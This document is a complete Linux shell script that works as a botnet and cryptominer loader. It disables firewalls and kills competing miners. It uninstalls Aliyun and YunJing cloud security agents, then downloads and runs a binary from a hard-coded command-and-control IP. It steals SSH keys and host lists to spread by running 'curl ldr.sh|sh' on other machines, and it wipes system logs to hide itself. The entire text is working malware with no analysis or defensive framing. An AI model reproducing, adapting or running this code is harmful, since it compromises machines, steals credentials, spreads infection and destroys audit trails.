export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
cc=http://194.145.227.21
sys=$(date|md5sum|awk -v n="$(date +%s)" '{print substr($1,1,n%7+6)}')

get() {
    curl -k $1>$2 || curl -k $1>$2 || wget --no-check-certificate -q -O- $1>$2 || curl $1>$2 || curl $1>$2 || wget -q -O- $1>$2 || ./dlr $1>$2 || ./dlr $1>$2
    chmod +x $2
}

ufw disable
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -F
chattr -ia /etc/ld.so.preload
cat /dev/null>/etc/ld.so.preload

mv /tmp/dlr dlr
mv /var/tmp/dlr dlr

crontab -l|sed '/\.bashgo\|pastebin\|onion\|bprofr\|python\|curl\|wget\|\.sh/d'|crontab -
cat /proc/mounts|awk '{print $2}'|grep -P '/proc/\d+'|grep -Po '\d+'|xargs -I % kill -9 %

pkill -9 -f mysqldd
pkill -9 -f monero
pkill -9 -f kinsing
pkill -9 -f sshpass
pkill -9 -f sshexec
pkill -9 -f cnrig
pkill -9 -f attack
pkill -9 -f dovecat
pkill -9 -f javae
pkill -9 -f donate
pkill -9 -f 'scan\.log'
pkill -9 -f xmr-stak
pkill -9 -f crond64
pkill -9 -f stratum
pkill -9 -f /tmp/java
pkill -9 -f pastebin
pkill -9 -f '/tmp/\.'
pkill -9 -f 'so\.txt'
pkill -9 -f 'bash -s 3673'
pkill -9 -f 8005/cc5
pkill -9 -f /tmp/system
pkill -9 -f '\./cliented'
pkill -9 -f '\.inis'
pkill -9 -f certutil
pkill -9 -f excludefile
pkill -9 -f agettyd
pkill -9 -f kthreaddkk
pkill -9 -f /dev/shm
pkill -9 -f /var/tmp
pkill -9 -f '\./python'
pkill -9 -f '\./crun'
pkill -9 -f 'bash -s kthreaddk'
pkill -9 -f '\./\.'
pkill -9 -f '118/cf\.sh'
pkill -9 -f '\./lin64'
pkill -9 -f 'confluence/install\.sh'
pkill -9 -f 'unls64\.sh'
pkill -9 -f '\./system-xfwm4-session'
pkill -9 -f '\./httpd'
pkill -9 -f xmrig
pkill -9 -f kthreaddi

pkill -9 '\.6379'
pkill -9 'load\.sh'
pkill -9 'init\.sh'
pkill -9 'solr\.sh'
pkill -9 '\.rsyslogds'
pkill -9 pnscan
pkill -9 masscan
pkill -9 juiceSSH
pkill -9 sysguard
pkill -9 kdevtmpfsi
pkill -9 solrd
pkill -9 polska
pkill -9 meminitsrv
pkill -9 networkservice
pkill -9 sysupdate
pkill -9 phpguard
pkill -9 phpupdate
pkill -9 networkmanager
pkill -9 knthread
pkill -9 mysqlserver
pkill -9 gitlabkill
pkill -9 watchbog
pkill -9 bashirc
pkill -9 zgrab

for i in $(ls /proc|grep '[0-9]'); do
  if ls -al /proc/$i 2>/dev/null|grep kthreaddk 2>/dev/null; then
     continue
  fi
  if grep -a 'donate-level' /proc/$i/exe 1>/dev/null 2>&1; then
    kill -9 $i
  fi
done

if [ $(id -u) -eq 0 ]; then
    if ps aux|grep -i "[a]liyun"; then
        curl http://update.aegis.aliyun.com/download/uninstall.sh|bash
        curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh|bash
        pkill aliyun-service
        rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service /usr/local/aegis*
        systemctl stop aliyun.service
        systemctl disable aliyun.service
        service bcm-agent stop
        yum remove bcm-agent -y
        apt-get remove bcm-agent -y
    elif ps aux|grep -i "[y]unjing"; then
        /usr/local/qcloud/stargate/admin/uninstall.sh
        /usr/local/qcloud/YunJing/uninst.sh
        /usr/local/qcloud/monitor/barad/admin/uninstall.sh
    fi
fi

cd /tmp || cd /var/tmp
ps -ef|grep -v bash|grep kthreaddk|grep -v grep; if [ $? -ne 0 ]; then
  PATH=".:$PATH"
  get $cc/sys.$(uname -m) $sys
  nohup $sys 1>/dev/null 2>&1 &
  sleep 1
fi
rm -rf /var/tmp/* /var/tmp/.* /tmp/* /tmp/.* $sys dlr

_sig="$HOME/.localssh"
if [ ! -f $_sig ]; then
touch $_sig
KEYS=$(find ~/ /root /home -maxdepth 2 -name 'id_rsa*'|grep -vw pub)
KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep IdentityFile|awk -F "IdentityFile" '{print $2 }')
KEYS3=$(find ~/ /root /home -maxdepth 3 -name '*.pem'|uniq)
HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep HostName|awk -F "HostName" '{print $2}')
HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history|grep -E "(ssh|scp)"|grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts|grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}"|uniq)
USERZ=$(
    echo root
    find ~/ /root /home -maxdepth 2 -name '\.ssh'|uniq|xargs find|awk '/id_rsa/'|awk -F'/' '{print $3}'|uniq|grep -v "\.ssh"
)
users=$(echo $USERZ|tr ' ' '\n'|nl|sort -u -k2|sort -n|cut -f2-)
hosts=$(echo "$HOSTS $HOSTS2 $HOSTS3"|grep -vw 127.0.0.1|tr ' ' '\n'|nl|sort -u -k2|sort -n|cut -f2-)
keys=$(echo "$KEYS $KEYS2 $KEYS3"|tr ' ' '\n'|nl|sort -u -k2|sort -n|cut -f2-)
for user in $users; do
    for host in $hosts; do
        for key in $keys; do
            chmod +r $key; chmod 400 $key
            ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host "(curl $cc/ldr.sh?ssh||curl $cc/ldr.sh?ssh2||wget -q -O- $cc/ldr.sh?ssh)|sh"
        done
    done
done
fi

echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
